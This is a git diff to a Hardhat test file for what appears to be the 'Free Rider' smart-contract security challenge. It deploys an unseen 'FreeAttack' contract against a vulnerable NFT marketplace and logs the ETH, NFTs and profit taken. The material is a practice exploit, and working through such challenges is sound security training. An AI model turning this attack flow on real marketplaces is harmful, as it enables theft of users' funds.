@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require("ethers");
 
 describe('[Challenge] Free Rider', function () {
     let deployer, attacker, buyer;
@@ -26,7 +27,7 @@ describe('[Challenge] Free Rider', function () {
         [deployer, attacker, buyer] = await ethers.getSigners();
 
         // Attacker starts with little ETH balance
-        await ethers.provider.send("hardhat_setBalance", [
+        await ethers.provider.send("hardhat_setBalance", [  
             attacker.address,
             "0x6f05b59d3b20000", // 0.5 ETH
         ]);
@@ -101,10 +102,35 @@ describe('[Challenge] Free Rider', function () {
             this.nft.address, 
             { value: BUYER_PAYOUT }
         );
+
+        this.freeAttack = await (await ethers.getContractFactory('FreeAttack', attacker)).deploy(
+            this.marketplace.address,
+            this.uniswapPair.address,
+            this.weth.address,
+            this.nft.address,
+            this.buyerContract.address
+        ); 
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        // We need some funds 
+        console.log("+--------------------------------+")
+        console.log("buyerContract ETH balance before: ", await (await ethers.provider.getBalance(this.buyerContract.address)).toString());
+        console.log("buyerContract NFTs before: ", await (await this.nft.balanceOf(this.buyerContract.address)).toString());
+        console.log("+--------------------------------+")
+
+        await this.freeAttack.connect(attacker).attack();
+
+        console.log("buyerContract ETH balance after: ", await (await ethers.provider.getBalance(this.buyerContract.address)).toString());
+        console.log("buyerContract NFTs after: ", await (await this.nft.balanceOf(this.buyerContract.address)).toString());
+        console.log("+--------------------------------+")
+
+        let totalProfit =  await ethers.provider.getBalance(attacker.address) - ethers.utils.parseEther('0.5');
+        console.log("TOTAL PROFIT (ETH): ", totalProfit.toString())
+        console.log("+--------------------------------+")
+
     });
 
     after(async function () {
